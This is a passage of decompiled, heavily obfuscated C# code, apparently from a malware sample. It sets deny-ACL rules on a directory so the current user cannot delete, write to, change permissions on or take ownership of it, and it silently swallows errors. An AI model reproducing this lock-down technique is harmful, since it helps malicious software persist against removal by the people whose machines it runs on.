		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		if (num1 * 7 + num1 * 25 - 8868864 != (-3047 | num1) * 32)
		{
			if (num2 != 3335)
			{
				directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				directorySecurity.SetAccessRuleProtection(false, true);
				directoryInfo.SetAccessControl(directorySecurity);
				return;
			}
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			length = sizeof(int) + 0;
			goto Label2;
		}
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		directorySecurity.SetAccessRuleProtection(false, true);
		directoryInfo.SetAccessControl(directorySecurity);
	}

	public static void _________________(string string_0)
	{
		DirectoryInfo directoryInfo;
		int length;
		int num;
		string str;
		DirectorySecurity directorySecurity;
		try
		{
		Label2:
			string string0 = string_0;
			str = Environment.UserName.ToString();
			directoryInfo = new DirectoryInfo(string0);
			length = Type.EmptyTypes.Length + 4317;
			______________________._______ = -1051365525;
			directorySecurity = new DirectorySecurity();
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.Read, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			num = length;
			length = -28546;
			if (num == 8875)
			{
				goto Label0;
			}
		Label3:
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ReadAndExecute, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
			num = length;
			length = -1301;
			if (num == -9041)
			{
				goto Label1;
			}
			goto Label0;
		}
		catch (Exception exception)
		{
			ProjectData.SetProjectError(exception);
			ProjectData.ClearProjectError();
		}
		return;
	Label0:
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.Delete, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		num = length;
		length = 18354;
		if (num != -18114)
		{
		}
		else if (~((-6175 | length) - (4456 & length ^ 3213)) != length - length * 512)
		{
			goto Label2;
		}
	Label1:
		do
		{
			directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.Write, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			num = length;
			length = 1419;
			if (num == 18354)
			{
				while (true)
				{
					directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ChangePermissions, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
					num = length;
					length = -10838;
					if (~(<Module>._________________ | -427) / 134217728 == -2058868628)
					{
						break;
					}
					if (num != 18730)
					{
						break;
					}
				}
				directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.TakeOwnership, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
				num = length;
				length = -28145;
				if (num == -10838)
				{
					(1853882368 * length << 3 | -1304) == -1304;
				}
				directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.WriteAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
			}
			else
			{
				goto Label3;
			}
		}
		while (length == -18286);
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.WriteExtendedAttributes, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Deny));
		directorySecurity.AddAccessRule(new FileSystemAccessRule(str, FileSystemRights.ReadData, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.None, AccessControlType.Allow));
		directoryInfo.SetAccessControl(directorySecurity);
	}

	[DllImport("kernel32", CharSet=CharSet.Unicode, ExactSpelling=false, SetLastError=true)]
	public static extern bool DeleteFile(string string_0);
}